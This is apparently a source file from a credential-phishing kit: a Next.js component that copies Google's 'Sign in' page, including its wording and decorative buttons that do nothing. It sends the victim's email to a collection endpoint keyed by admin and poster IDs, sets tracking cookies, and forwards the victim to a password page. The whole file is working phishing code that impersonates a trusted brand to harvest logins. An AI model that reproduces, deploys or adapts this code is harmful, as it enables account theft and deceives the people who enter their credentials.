"use client";
import { API_URL, SITE } from "@/config";
import Cookies from "js-cookie";
import Image from "next/image";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";

function Signin({ adminId, posterId }) {
  const [email, setEmail] = useState("");
  const router = useRouter();
  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, [adminId, posterId]);
  const handleEmail = async () => {
    try {
      if (!email) {
        return;
      }
      const values = {
        email: email,
        site: SITE,
      };
      const url = `${API_URL}/email/post/${adminId}/${posterId}`;
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-type": "application/json",
        },
        body: JSON.stringify(values),
      });
      const data = await response.json();
      if (response.ok) {
        Cookies.set("email", data?.info?.email);
        Cookies.set("id", data?.info?._id);
        router.push("/password");
      }
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <div className=" w-full min-h-screen flex flex-col justify-center items-center">
      <div className="flex flex-col max-w-md  h-screen p-10 justify-between">
        <div className="flex flex-col gap-6">
          <div className="flex flex-col  gap-3">
            <div className="">
              <Image
                src={"/logo.png"}
                alt="logo"
                width={100}
                height={100}
                className="object-cover "
              />
            </div>
            <div className="flex flex-col gap-2">
              <h1 className="text-2xl font-normal mb-1">Sign in</h1>

              <div>
                <p className="text-base text-gray-600">
                  Use your Google Account. The account will be added to this
                  device and available to other Google apps.
                </p>
                <p className="text-blue-500 font-bold">
                  Learn more about using your account.
                </p>
              </div>
            </div>
          </div>
          <div className="flex flex-col gap-10 ">
            <div>
              <input
                type="email"
                id="email"
                className={`w-full border  border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
                placeholder="Enter Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />

              <button className="text-blue-600 font-medium text-sm mt-2">
                Forgot email?
              </button>
            </div>
            <div className="flex justify-start">
              <button className="text-blue-600 font-semibold">
                Create account
              </button>
            </div>
          </div>
        </div>
        <div className="flex justify-end">
          <button
            className="w-fit  bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 font-semibold"
            onClick={() => handleEmail()}
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
}

export default Signin;
